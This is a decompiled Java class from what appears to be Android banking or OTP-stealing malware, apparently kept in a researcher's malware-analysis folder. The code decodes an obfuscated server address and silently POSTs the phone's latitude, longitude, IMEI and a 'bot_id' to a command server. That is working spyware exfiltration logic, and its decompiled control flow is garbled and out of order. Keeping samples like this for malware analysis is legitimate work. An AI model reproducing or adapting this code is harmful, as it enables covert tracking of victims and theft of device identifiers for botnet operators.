import android.content.Context;
import com.soft360.iService.AService;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.params.HttpParams;

final class dZ
  implements Runnable
{
  dZ(dY paramdY, double paramDouble1, double paramDouble2) {}
  
  public final void run()
  {
    DefaultHttpClient localDefaultHttpClient = new DefaultHttpClient();
    localDefaultHttpClient.getParams().setParameter("http.protocol.content-charset", "UTF-8");
    Object localObject1 = AService.jdField_a_of_type_AndroidContentContext.getString(2131165194);
    try
    {
      localObject2 = this.jdField_a_of_type_DY.a.a;
      localObject2 = new String(cD.a((String)localObject1));
      localObject1 = localObject2;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        try
        {
          Object localObject2 = new ArrayList();
          ((List)localObject2).add(new BasicNameValuePair("latitude", this.jdField_a_of_type_Double));
          ((List)localObject2).add(new BasicNameValuePair("longitude", this.b));
          ((List)localObject2).add(new BasicNameValuePair("coord", "coord"));
          ((List)localObject2).add(new BasicNameValuePair("bot_id", this.jdField_a_of_type_DY.a.b()));
          dU localdU = this.jdField_a_of_type_DY.a;
          ((List)localObject2).add(new BasicNameValuePair("imei", dU.a()));
          ((HttpPost)localObject1).setEntity(new UrlEncodedFormEntity((List)localObject2, "UTF-8"));
          localDefaultHttpClient.execute((HttpUriRequest)localObject1);
          return;
        }
        catch (IOException localIOException)
        {
          localIOException.printStackTrace();
          return;
        }
        catch (ClientProtocolException localClientProtocolException) {}
        localException = localException;
        localException.printStackTrace();
      }
    }
    localObject1 = new HttpPost(this.jdField_a_of_type_DY.a.a(AService.jdField_a_of_type_Int) + (String)localObject1);
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/fb_otp/classes-dex2jar.jar!/dZ.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */